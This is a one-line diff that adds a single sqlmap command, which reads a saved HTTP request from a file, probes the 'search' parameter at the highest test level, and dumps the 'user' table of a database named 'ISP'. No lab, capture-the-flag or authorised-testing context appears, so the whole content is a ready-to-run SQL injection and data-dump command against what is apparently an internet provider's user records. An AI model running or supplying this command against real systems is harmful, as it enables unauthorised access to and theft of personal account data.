@@ -1,0 +1,1 @@
+sqlmap -r sql.txt -p search -threads 10 --level 5 -dump -D ISP -T user
